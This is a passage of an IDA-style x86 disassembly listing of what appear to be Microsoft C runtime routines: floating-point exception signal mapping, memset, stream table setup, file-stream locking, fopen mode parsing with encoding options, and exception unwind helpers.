; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4133AD      proc near               ; CODE XREF: sub_410254+C↑p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    esi
                call    sub_41238C
                mov     esi, eax
                test    esi, esi
                jz      loc_41350A
                mov     edx, [esi+5Ch]
                mov     eax, dword_4257F0
                push    edi
                mov     edi, [ebp+arg_0]
                mov     ecx, edx
                push    ebx

loc_4133D3:                             ; CODE XREF: sub_4133AD+36↓j
                cmp     [ecx], edi
                jz      short loc_4133E5
                mov     ebx, eax
                imul    ebx, 0Ch
                add     ecx, 0Ch
                add     ebx, edx
                cmp     ecx, ebx
                jb      short loc_4133D3

loc_4133E5:                             ; CODE XREF: sub_4133AD+28↑j
                imul    eax, 0Ch
                add     eax, edx
                cmp     ecx, eax
                jnb     short loc_4133F6
                cmp     [ecx], edi
                jnz     short loc_4133F6
                mov     eax, ecx
                jmp     short loc_4133F8
; ---------------------------------------------------------------------------

loc_4133F6:                             ; CODE XREF: sub_4133AD+3F↑j
                                        ; sub_4133AD+43↑j
                xor     eax, eax

loc_4133F8:                             ; CODE XREF: sub_4133AD+47↑j
                test    eax, eax
                jz      short loc_413406
                mov     ebx, [eax+8]
                mov     [ebp+var_4], ebx
                test    ebx, ebx
                jnz     short loc_41340D

loc_413406:                             ; CODE XREF: sub_4133AD+4D↑j
                xor     eax, eax
                jmp     loc_413508
; ---------------------------------------------------------------------------

loc_41340D:                             ; CODE XREF: sub_4133AD+57↑j
                cmp     ebx, 5
                jnz     short loc_41341E
                and     dword ptr [eax+8], 0
                xor     eax, eax
                inc     eax
                jmp     loc_413508
; ---------------------------------------------------------------------------

loc_41341E:                             ; CODE XREF: sub_4133AD+63↑j
                cmp     ebx, 1
                jz      loc_413505
                mov     ecx, [esi+60h]
                mov     [ebp+var_8], ecx
                mov     ecx, [ebp+arg_4]
                mov     [esi+60h], ecx
                mov     ecx, [eax+4]
                cmp     ecx, 8
                jnz     loc_4134F7
                mov     ecx, dword_4257E4
                mov     edi, dword_4257E8
                mov     edx, ecx
                add     edi, ecx
                cmp     edx, edi
                jge     short loc_413477
                imul    ecx, 0Ch

loc_413456:                             ; CODE XREF: sub_4133AD+C5↓j
                mov     edi, [esi+5Ch]
                and     dword ptr [ecx+edi+8], 0
                mov     edi, dword_4257E4
                mov     ebx, dword_4257E8
                inc     edx
                add     ebx, edi
                add     ecx, 0Ch
                cmp     edx, ebx
                jl      short loc_413456
                mov     ebx, [ebp+var_4]

loc_413477:                             ; CODE XREF: sub_4133AD+A4↑j
                mov     eax, [eax]
                mov     edi, [esi+64h]
                cmp     eax, 0C000008Eh
                jnz     short loc_41348C
                mov     dword ptr [esi+64h], 83h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_41348C:                             ; CODE XREF: sub_4133AD+D4↑j
                cmp     eax, 0C0000090h
                jnz     short loc_41349C
                mov     dword ptr [esi+64h], 81h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_41349C:                             ; CODE XREF: sub_4133AD+E4↑j
                cmp     eax, 0C0000091h
                jnz     short loc_4134AC
                mov     dword ptr [esi+64h], 84h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_4134AC:                             ; CODE XREF: sub_4133AD+F4↑j
                cmp     eax, 0C0000093h
                jnz     short loc_4134BC
                mov     dword ptr [esi+64h], 85h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_4134BC:                             ; CODE XREF: sub_4133AD+104↑j
                cmp     eax, 0C000008Dh
                jnz     short loc_4134CC
                mov     dword ptr [esi+64h], 82h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_4134CC:                             ; CODE XREF: sub_4133AD+114↑j
                cmp     eax, 0C000008Fh
                jnz     short loc_4134DC
                mov     dword ptr [esi+64h], 86h
                jmp     short loc_4134EA
; ---------------------------------------------------------------------------

loc_4134DC:                             ; CODE XREF: sub_4133AD+124↑j
                cmp     eax, 0C0000092h
                jnz     short loc_4134EA
                mov     dword ptr [esi+64h], 8Ah

loc_4134EA:                             ; CODE XREF: sub_4133AD+DD↑j
                                        ; sub_4133AD+ED↑j ...
                push    dword ptr [esi+64h]
                push    8
                call    ebx
                pop     ecx
                mov     [esi+64h], edi
                jmp     short loc_4134FE
; ---------------------------------------------------------------------------

loc_4134F7:                             ; CODE XREF: sub_4133AD+8C↑j
                and     dword ptr [eax+8], 0
                push    ecx
                call    ebx

loc_4134FE:                             ; CODE XREF: sub_4133AD+148↑j
                mov     eax, [ebp+var_8]
                pop     ecx
                mov     [esi+60h], eax

loc_413505:                             ; CODE XREF: sub_4133AD+74↑j
                or      eax, 0FFFFFFFFh

loc_413508:                             ; CODE XREF: sub_4133AD+5B↑j
                                        ; sub_4133AD+6C↑j
                pop     ebx
                pop     edi

loc_41350A:                             ; CODE XREF: sub_4133AD+11↑j
                pop     esi
                leave
                retn
sub_4133AD      endp


; =============== S U B R O U T I N E =======================================


sub_41350D      proc near               ; CODE XREF: sub_40EB2C+103↑p
                                        ; sub_40EC54+1A↑p ...
                and     dword_42DB24, 0
                retn
sub_41350D      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_413520      proc near               ; CODE XREF: sub_401AE0+65↑p
                                        ; sub_401AE0+79↑p ...

arg_0           = dword ptr  4
arg_4           = byte ptr  8
arg_8           = dword ptr  0Ch

                mov     edx, [esp+arg_8]
                mov     ecx, [esp+arg_0]
                test    edx, edx
                jz      short loc_413595
                xor     eax, eax
                mov     al, [esp+arg_4]
                test    al, al
                jnz     short loc_41354C
                cmp     edx, 100h
                jb      short loc_41354C
                cmp     dword_42C9EC, 0
                jz      short loc_41354C
                jmp     sub_419D58
; ---------------------------------------------------------------------------

loc_41354C:                             ; CODE XREF: sub_413520+14↑j
                                        ; sub_413520+1C↑j ...
                push    edi
                mov     edi, ecx
                cmp     edx, 4
                jb      short loc_413585
                neg     ecx
                and     ecx, 3
                jz      short loc_413567
                sub     edx, ecx

loc_41355D:                             ; CODE XREF: sub_413520+45↓j
                mov     [edi], al
                add     edi, 1
                sub     ecx, 1
                jnz     short loc_41355D

loc_413567:                             ; CODE XREF: sub_413520+39↑j
                mov     ecx, eax
                shl     eax, 8
                add     eax, ecx
                mov     ecx, eax
                shl     eax, 10h
                add     eax, ecx
                mov     ecx, edx
                and     edx, 3
                shr     ecx, 2
                jz      short loc_413585
                rep stosd
                test    edx, edx
                jz      short loc_41358F

loc_413585:                             ; CODE XREF: sub_413520+32↑j
                                        ; sub_413520+5D↑j ...
                mov     [edi], al
                add     edi, 1
                sub     edx, 1
                jnz     short loc_413585

loc_41358F:                             ; CODE XREF: sub_413520+63↑j
                mov     eax, [esp+4+arg_0]
                pop     edi
                retn
; ---------------------------------------------------------------------------

loc_413595:                             ; CODE XREF: sub_413520+A↑j
                mov     eax, [esp+arg_0]
                retn
sub_413520      endp


; =============== S U B R O U T I N E =======================================


sub_41359A      proc near               ; CODE XREF: sub_410957+79↑p
                                        ; sub_410957+85↑p
                mov     eax, offset off_425800
                retn
sub_41359A      endp


; =============== S U B R O U T I N E =======================================


sub_4135A0      proc near               ; DATA XREF: .rdata:0042020C↓o
                mov     eax, dword_42DB20
                push    esi
                push    14h
                pop     esi
                test    eax, eax
                jnz     short loc_4135B4
                mov     eax, 200h
                jmp     short loc_4135BA
; ---------------------------------------------------------------------------

loc_4135B4:                             ; CODE XREF: sub_4135A0+B↑j
                cmp     eax, esi
                jge     short loc_4135BF
                mov     eax, esi

loc_4135BA:                             ; CODE XREF: sub_4135A0+12↑j
                mov     dword_42DB20, eax

loc_4135BF:                             ; CODE XREF: sub_4135A0+16↑j
                push    4
                push    eax
                call    sub_412BF8
                pop     ecx
                pop     ecx
                mov     dword_42CB00, eax
                test    eax, eax
                jnz     short loc_4135F0
                push    4
                push    esi
                mov     dword_42DB20, esi
                call    sub_412BF8
                pop     ecx
                pop     ecx
                mov     dword_42CB00, eax
                test    eax, eax
                jnz     short loc_4135F0
                push    1Ah
                pop     eax
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_4135F0:                             ; CODE XREF: sub_4135A0+30↑j
                                        ; sub_4135A0+49↑j
                xor     edx, edx
                mov     ecx, offset off_425800
                jmp     short loc_4135FE
; ---------------------------------------------------------------------------

loc_4135F9:                             ; CODE XREF: sub_4135A0+6D↓j
                mov     eax, dword_42CB00

loc_4135FE:                             ; CODE XREF: sub_4135A0+57↑j
                mov     [edx+eax], ecx
                add     ecx, 20h
                add     edx, 4
                cmp     ecx, offset byte_425A80
                jl      short loc_4135F9
                push    0FFFFFFFEh
                pop     esi
                xor     edx, edx
                mov     ecx, offset unk_425810
                push    edi

loc_41361A:                             ; CODE XREF: sub_4135A0+AA↓j
                mov     eax, edx
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                mov     edi, edx
                and     edi, 1Fh
                shl     edi, 6
                mov     eax, [edi+eax]
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41363E
                cmp     eax, esi
                jz      short loc_41363E
                test    eax, eax
                jnz     short loc_413640

loc_41363E:                             ; CODE XREF: sub_4135A0+94↑j
                                        ; sub_4135A0+98↑j
                mov     [ecx], esi

loc_413640:                             ; CODE XREF: sub_4135A0+9C↑j
                add     ecx, 20h
                inc     edx
                cmp     ecx, offset unk_425870
                jl      short loc_41361A
                pop     edi
                xor     eax, eax
                pop     esi
                retn
sub_4135A0      endp


; =============== S U B R O U T I N E =======================================


sub_413651      proc near               ; DATA XREF: .rdata:00420224↓o
                call    sub_41524E
                cmp     byte_42AE80, 0
                jz      short loc_413664
                call    sub_419DE7

loc_413664:                             ; CODE XREF: sub_413651+C↑j
                push    dword_42CB00    ; lpMem
                call    sub_40FD55
                pop     ecx
                retn
sub_413651      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413671      proc near               ; CODE XREF: sub_40F074+58↑p
                                        ; sub_40F345+47↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                mov     eax, offset off_425800
                cmp     esi, eax
                jb      short loc_4136A5
                cmp     esi, offset unk_425A60
                ja      short loc_4136A5
                mov     ecx, esi
                sub     ecx, eax
                sar     ecx, 5
                add     ecx, 10h
                push    ecx
                call    sub_416913
                or      dword ptr [esi+0Ch], 8000h
                pop     ecx
                jmp     short loc_4136AF
; ---------------------------------------------------------------------------

loc_4136A5:                             ; CODE XREF: sub_413671+10↑j
                                        ; sub_413671+18↑j
                add     esi, 20h
                push    esi             ; lpCriticalSection
                call    ds:EnterCriticalSection

loc_4136AF:                             ; CODE XREF: sub_413671+32↑j
                pop     esi
                pop     ebp
                retn
sub_413671      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4136B2      proc near               ; CODE XREF: sub_413A18+6E↓p
                                        ; sub_415174+46↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                cmp     eax, 14h
                jge     short loc_4136D5
                add     eax, 10h
                push    eax
                call    sub_416913
                mov     eax, [ebp+arg_4]
                or      dword ptr [eax+0Ch], 8000h
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4136D5:                             ; CODE XREF: sub_4136B2+B↑j
                mov     eax, [ebp+arg_4]
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    ds:EnterCriticalSection
                pop     ebp
                retn
sub_4136B2      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4136E4      proc near               ; CODE XREF: sub_40EC8A+BD↑p
                                        ; sub_40F074+8F↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, offset off_425800
                cmp     eax, ecx
                jb      short loc_413714
                cmp     eax, offset unk_425A60
                ja      short loc_413714
                and     dword ptr [eax+0Ch], 0FFFF7FFFh
                sub     eax, ecx
                sar     eax, 5
                add     eax, 10h
                push    eax
                call    sub_416839
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_413714:                             ; CODE XREF: sub_4136E4+F↑j
                                        ; sub_4136E4+16↑j
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    ds:LeaveCriticalSection
                pop     ebp
                retn
sub_4136E4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413720      proc near               ; CODE XREF: sub_413A18+85↓p
                                        ; sub_415174+AB↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                cmp     ecx, 14h
                mov     eax, [ebp+arg_4]
                jge     short loc_413743
                and     dword ptr [eax+0Ch], 0FFFF7FFFh
                add     ecx, 10h
                push    ecx
                call    sub_416839
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_413743:                             ; CODE XREF: sub_413720+E↑j
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    ds:LeaveCriticalSection
                pop     ebp
                retn
sub_413720      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41374F      proc near               ; CODE XREF: sub_40EC8A+9A↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
lpFileName      = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     eax, dword_42B468
                push    ebx
                xor     ebx, ebx
                push    esi
                mov     esi, [ebp+arg_4]
                mov     [ebp+var_4], eax
                mov     [ebp+var_C], ebx
                mov     [ebp+var_8], ebx
                mov     [ebp+var_10], ebx
                jmp     short loc_413772
; ---------------------------------------------------------------------------

loc_413771:                             ; CODE XREF: sub_41374F+26↓j
                inc     esi

loc_413772:                             ; CODE XREF: sub_41374F+20↑j
                cmp     byte ptr [esi], 20h
                jz      short loc_413771
                mov     al, [esi]
                cmp     al, 61h
                jz      short loc_4137B6
                cmp     al, 72h
                jz      short loc_4137AD
                cmp     al, 77h
                jz      short loc_4137A4
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     loc_413A14
; ---------------------------------------------------------------------------

loc_4137A4:                             ; CODE XREF: sub_41374F+34↑j
                mov     [ebp+arg_4], 301h
                jmp     short loc_4137BD
; ---------------------------------------------------------------------------

loc_4137AD:                             ; CODE XREF: sub_41374F+30↑j
                or      [ebp+var_4], 1
                mov     [ebp+arg_4], ebx
                jmp     short loc_4137C1
; ---------------------------------------------------------------------------

loc_4137B6:                             ; CODE XREF: sub_41374F+2C↑j
                mov     [ebp+arg_4], 109h

loc_4137BD:                             ; CODE XREF: sub_41374F+5C↑j
                or      [ebp+var_4], 2

loc_4137C1:                             ; CODE XREF: sub_41374F+65↑j
                xor     ecx, ecx
                inc     ecx
                inc     esi
                mov     al, [esi]
                push    edi
                cmp     al, bl
                jz      loc_4139AE
                lea     edx, [ecx+7Fh]
                mov     edi, 4000h

loc_4137D8:                             ; CODE XREF: sub_41374F+1B9↓j
                cmp     ecx, ebx
                jz      loc_41390E
                movsx   eax, al
                cmp     eax, 53h
                jg      loc_41388E
                jz      loc_41387C
                sub     eax, 20h
                jz      loc_413903
                sub     eax, 0Bh
                jz      short loc_413856
                dec     eax
                jz      short loc_41384A
                sub     eax, 18h
                jz      short loc_413837
                sub     eax, 0Ah
                jz      short loc_41382F
                sub     eax, 4
                jnz     loc_4139B7
                cmp     [ebp+var_8], ebx
                jnz     loc_4138F8
                or      [ebp+arg_4], 10h
                mov     [ebp+var_8], 1
                jmp     loc_413903
; ---------------------------------------------------------------------------

loc_41382F:                             ; CODE XREF: sub_41374F+BC↑j
                or      [ebp+arg_4], edx
                jmp     loc_413903
; ---------------------------------------------------------------------------

loc_413837:                             ; CODE XREF: sub_41374F+B7↑j
                test    byte ptr [ebp+arg_4], 40h
                jnz     loc_4138F8
                or      [ebp+arg_4], 40h
                jmp     loc_413903
; ---------------------------------------------------------------------------

loc_41384A:                             ; CODE XREF: sub_41374F+B2↑j
                mov     [ebp+var_10], 1
                jmp     loc_4138F8
; ---------------------------------------------------------------------------

loc_413856:                             ; CODE XREF: sub_41374F+AF↑j
                test    byte ptr [ebp+arg_4], 2
                jnz     loc_4138F8
                mov     eax, [ebp+arg_4]
                and     eax, 0FFFFFFFEh
                or      eax, 2
                mov     [ebp+arg_4], eax
                mov     eax, [ebp+var_4]
                and     eax, 0FFFFFFFCh
                or      eax, edx
                mov     [ebp+var_4], eax
                jmp     loc_413903
; ---------------------------------------------------------------------------

loc_41387C:                             ; CODE XREF: sub_41374F+9D↑j
                cmp     [ebp+var_8], ebx
                jnz     short loc_4138F8
                or      [ebp+arg_4], 20h
                mov     [ebp+var_8], 1
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_41388E:                             ; CODE XREF: sub_41374F+97↑j
                sub     eax, 54h
                jz      short loc_4138EF
                sub     eax, 0Eh
                jz      short loc_4138DD
                dec     eax
                jz      short loc_4138CC
                sub     eax, 0Bh
                jz      short loc_4138B7
                sub     eax, 6
                jnz     loc_4139B7
                test    [ebp+arg_4], 0C000h
                jnz     short loc_4138F8
                or      [ebp+arg_4], edi
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_4138B7:                             ; CODE XREF: sub_41374F+14F↑j
                cmp     [ebp+var_C], ebx
                jnz     short loc_4138F8
                and     [ebp+var_4], 0FFFFBFFFh
                mov     [ebp+var_C], 1
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_4138CC:                             ; CODE XREF: sub_41374F+14A↑j
                cmp     [ebp+var_C], ebx
                jnz     short loc_4138F8
                or      [ebp+var_4], edi
                mov     [ebp+var_C], 1
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_4138DD:                             ; CODE XREF: sub_41374F+147↑j
                test    [ebp+arg_4], 0C000h
                jnz     short loc_4138F8
                or      [ebp+arg_4], 8000h
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_4138EF:                             ; CODE XREF: sub_41374F+142↑j
                test    [ebp+arg_4], 1000h
                jz      short loc_4138FC

loc_4138F8:                             ; CODE XREF: sub_41374F+CA↑j
                                        ; sub_41374F+EC↑j ...
                xor     ecx, ecx
                jmp     short loc_413903
; ---------------------------------------------------------------------------

loc_4138FC:                             ; CODE XREF: sub_41374F+1A7↑j
                or      [ebp+arg_4], 1000h

loc_413903:                             ; CODE XREF: sub_41374F+A6↑j
                                        ; sub_41374F+DB↑j ...
                inc     esi
                mov     al, [esi]
                cmp     al, bl
                jnz     loc_4137D8

loc_41390E:                             ; CODE XREF: sub_41374F+8B↑j
                cmp     [ebp+var_10], ebx
                jz      loc_4139AE
                jmp     short loc_41391A
; ---------------------------------------------------------------------------

loc_413919:                             ; CODE XREF: sub_41374F+1CE↓j
                inc     esi

loc_41391A:                             ; CODE XREF: sub_41374F+1C8↑j
                cmp     byte ptr [esi], 20h
                jz      short loc_413919
                push    3
                push    esi
                push    offset unk_420508
                call    sub_41AA40
                add     esp, 0Ch
                test    eax, eax
                jnz     loc_4139B7
                add     esi, 3
                jmp     short loc_41393D
; ---------------------------------------------------------------------------

loc_41393C:                             ; CODE XREF: sub_41374F+1F1↓j
                inc     esi

loc_41393D:                             ; CODE XREF: sub_41374F+1EB↑j
                cmp     byte ptr [esi], 20h
                jz      short loc_41393C
                cmp     byte ptr [esi], 3Dh
                jnz     short loc_4139B7

loc_413947:                             ; CODE XREF: sub_41374F+1FC↓j
                inc     esi
                cmp     byte ptr [esi], 20h
                jz      short loc_413947
                push    5
                push    offset aUtf8    ; "UTF-8"
                push    esi
                call    sub_41A8BC
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_41396D
                add     esi, 5
                or      [ebp+arg_4], 40000h
                jmp     short loc_4139AE
; ---------------------------------------------------------------------------

loc_41396D:                             ; CODE XREF: sub_41374F+210↑j
                push    8
                push    offset aUtf16le ; "UTF-16LE"
                push    esi
                call    sub_41A8BC
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_41398D
                add     esi, 8
                or      [ebp+arg_4], 20000h
                jmp     short loc_4139AE
; ---------------------------------------------------------------------------

loc_41398D:                             ; CODE XREF: sub_41374F+230↑j
                push    7
                push    offset aUnicode ; "UNICODE"
                push    esi
                call    sub_41A8BC
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4139B7
                add     esi, 7
                or      [ebp+arg_4], 10000h
                jmp     short loc_4139AE
; ---------------------------------------------------------------------------

loc_4139AD:                             ; CODE XREF: sub_41374F+262↓j
                inc     esi

loc_4139AE:                             ; CODE XREF: sub_41374F+7B↑j
                                        ; sub_41374F+1C2↑j ...
                cmp     byte ptr [esi], 20h
                jz      short loc_4139AD
                cmp     [esi], bl
                jz      short loc_4139D1

loc_4139B7:                             ; CODE XREF: sub_41374F+C1↑j
                                        ; sub_41374F+154↑j ...
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_4139EF
; ---------------------------------------------------------------------------

loc_4139D1:                             ; CODE XREF: sub_41374F+266↑j
                push    180h            ; int
                push    [ebp+arg_8]     ; int
                lea     eax, [ebp+var_10]
                push    [ebp+arg_4]     ; int
                push    [ebp+lpFileName] ; lpFileName
                push    eax             ; int
                call    sub_41A671
                add     esp, 14h
                test    eax, eax
                jz      short loc_4139F3

loc_4139EF:                             ; CODE XREF: sub_41374F+280↑j
                xor     eax, eax
                jmp     short loc_413A13
; ---------------------------------------------------------------------------

loc_4139F3:                             ; CODE XREF: sub_41374F+29E↑j
                mov     eax, [ebp+arg_C]
                inc     dword_42AE8C
                mov     ecx, [ebp+var_4]
                mov     [eax+0Ch], ecx
                mov     ecx, [ebp+var_10]
                mov     [eax+4], ebx
                mov     [eax], ebx
                mov     [eax+8], ebx
                mov     [eax+1Ch], ebx
                mov     [eax+10h], ecx

loc_413A13:                             ; CODE XREF: sub_41374F+2A2↑j
                pop     edi

loc_413A14:                             ; CODE XREF: sub_41374F+50↑j
                pop     esi
                pop     ebx
                leave
                retn
sub_41374F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413A18      proc near               ; CODE XREF: sub_40EC8A+54↑p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    10h
                push    offset stru_422E98
                call    __SEH_prolog4
                xor     ebx, ebx
                xor     edi, edi
                mov     [ebp+var_1C], edi
                push    1
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                xor     esi, esi

loc_413A38:                             ; CODE XREF: sub_413A18+8D↓j
                mov     [ebp+var_20], esi
                cmp     esi, dword_42DB20
                jge     loc_413B16
                mov     eax, dword_42CB00
                lea     eax, [eax+esi*4]
                cmp     [eax], ebx
                jz      short loc_413AAE
                mov     eax, [eax]
                mov     eax, [eax+0Ch]
                test    al, 83h
                jnz     short loc_413AA4
                test    eax, 8000h
                jnz     short loc_413AA4
                lea     eax, [esi-3]
                cmp     eax, 10h
                ja      short loc_413A7D
                lea     eax, [esi+10h]
                push    eax
                call    sub_416850
                pop     ecx
                test    eax, eax
                jz      loc_413B16

loc_413A7D:                             ; CODE XREF: sub_413A18+51↑j
                mov     eax, dword_42CB00
                push    dword ptr [eax+esi*4]
                push    esi
                call    sub_4136B2
                pop     ecx
                pop     ecx
                mov     eax, dword_42CB00
                mov     eax, [eax+esi*4]
                test    byte ptr [eax+0Ch], 83h
                jz      short loc_413AA7
                push    eax
                push    esi
                call    sub_413720
                pop     ecx
                pop     ecx

loc_413AA4:                             ; CODE XREF: sub_413A18+42↑j
                                        ; sub_413A18+49↑j
                inc     esi
                jmp     short loc_413A38
; ---------------------------------------------------------------------------

loc_413AA7:                             ; CODE XREF: sub_413A18+81↑j
                mov     edi, eax
                mov     [ebp+var_1C], edi
                jmp     short loc_413B16
; ---------------------------------------------------------------------------

loc_413AAE:                             ; CODE XREF: sub_413A18+39↑j
                shl     esi, 2
                push    38h
                call    sub_412BB3
                pop     ecx
                mov     ecx, dword_42CB00
                mov     [esi+ecx], eax
                mov     eax, dword_42CB00
                add     eax, esi
                cmp     [eax], ebx
                jz      short loc_413B16
                push    0FA0h           ; dwSpinCount
                mov     eax, [eax]
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                mov     eax, dword_42CB00
                jnz     short loc_413AFB
                push    dword ptr [esi+eax] ; lpMem
                call    sub_40FD55
                pop     ecx
                mov     eax, dword_42CB00
                mov     [esi+eax], ebx
                jmp     short loc_413B16
; ---------------------------------------------------------------------------

loc_413AFB:                             ; CODE XREF: sub_413A18+CE↑j
                mov     eax, [esi+eax]
                add     eax, 20h
                push    eax             ; lpCriticalSection
                call    ds:EnterCriticalSection
                mov     eax, dword_42CB00
                mov     edi, [esi+eax]
                mov     [ebp+var_1C], edi
                mov     [edi+0Ch], ebx

loc_413B16:                             ; CODE XREF: sub_413A18+29↑j
                                        ; sub_413A18+5F↑j ...
                cmp     edi, ebx
                jz      short loc_413B30
                and     dword ptr [edi+0Ch], 8000h
                mov     [edi+4], ebx
                mov     [edi+8], ebx
                mov     [edi], ebx
                mov     [edi+1Ch], ebx
                or      dword ptr [edi+10h], 0FFFFFFFFh

loc_413B30:                             ; CODE XREF: sub_413A18+100↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_413B47
; ---------------------------------------------------------------------------

loc_413B3C:                             ; CODE XREF: sub_413A18+137↓j
                mov     eax, edi
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_413B44:                             ; DATA XREF: .rdata:stru_422E98↓o
                mov     edi, [ebp+var_1C]

loc_413B47:                             ; CODE XREF: sub_413A18+11F↑j
                push    1
                call    sub_416839
                pop     ecx
                retn
sub_413A18      endp


; =============== S U B R O U T I N E =======================================


sub_413B50      proc near               ; CODE XREF: sub_40EC8A+8A↑p
                                        ; sub_413BE0+2D↓p ...

var_20          = dword ptr -20h
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                push    ebx
                push    esi
                push    edi
                mov     edx, [esp+0Ch+arg_0]
                mov     eax, [esp+0Ch+arg_4]
                mov     ecx, [esp+0Ch+arg_8]
                push    ebp
                push    edx
                push    eax
                push    ecx
                push    ecx
                push    offset sub_413BE0
                push    large dword ptr fs:0
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+28h+var_20], eax
                mov     large fs:0, esp

loc_413B82:                             ; CODE XREF: sub_413B50+64↓j
                                        ; sub_413B50+80↓j
                mov     eax, [esp+28h+arg_4]
                mov     ebx, [eax+8]
                mov     ecx, [esp+28h+arg_0]
                xor     ebx, [ecx]
                mov     esi, [eax+0Ch]
                cmp     esi, 0FFFFFFFEh
                jz      short loc_413BD2
                mov     edx, [esp+28h+arg_8]
                cmp     edx, 0FFFFFFFEh
                jz      short loc_413BA4
                cmp     esi, edx
                jbe     short loc_413BD2

loc_413BA4:                             ; CODE XREF: sub_413B50+4E↑j
                lea     esi, [esi+esi*2]
                lea     ebx, [ebx+esi*4+10h]
                mov     ecx, [ebx]
                mov     [eax+0Ch], ecx
                cmp     dword ptr [ebx+4], 0
                jnz     short loc_413B82
                push    101h
                mov     eax, [ebx+8]
                call    sub_41AB71
                mov     ecx, 1
                mov     eax, [ebx+8]
                call    sub_41AB90
                jmp     short loc_413B82
; ---------------------------------------------------------------------------

loc_413BD2:                             ; CODE XREF: sub_413B50+45↑j
                                        ; sub_413B50+52↑j
                pop     large dword ptr fs:0
                add     esp, 18h
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_413B50      endp


; =============== S U B R O U T I N E =======================================


sub_413BE0      proc near               ; DATA XREF: sub_413B50+14↑o
                                        ; .rdata:00422AFC↓o

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_C           = dword ptr  10h

                mov     ecx, [esp+arg_0]
                test    dword ptr [ecx+4], 6
                mov     eax, 1
                jz      short locret_413C25
                mov     eax, [esp+arg_4]
                mov     ecx, [eax+8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                push    ebp
                mov     ebp, [eax+18h]
                push    dword ptr [eax+0Ch]
                push    dword ptr [eax+10h]
                push    dword ptr [eax+14h]
                call    sub_413B50
                add     esp, 0Ch
                pop     ebp
                mov     eax, [esp+arg_4]
                mov     edx, [esp+arg_C]
                mov     [edx], eax
                mov     eax, 3

locret_413C25:                          ; CODE XREF: sub_413BE0+10↑j
                retn
sub_413BE0      endp

; ---------------------------------------------------------------------------
                push    ebp
                mov     ecx, [esp+8]
                mov     ebp, [ecx]
                push    dword ptr [ecx+1Ch]
                push    dword ptr [ecx+18h]
                push    dword ptr [ecx+28h]
                call    sub_413B50
                add     esp, 0Ch
                pop     ebp
                retn    4

; =============== S U B R O U T I N E =======================================


sub_413C42      proc near               ; CODE XREF: SEH_4132F0+89↑p
                push    ebp
                push    esi
                push    edi
                push    ebx
                mov     ebp, edx
                xor     eax, eax
                xor     ebx, ebx
                xor     edx, edx
                xor     esi, esi
                xor     edi, edi
                call    ecx
                pop     ebx
                pop     edi
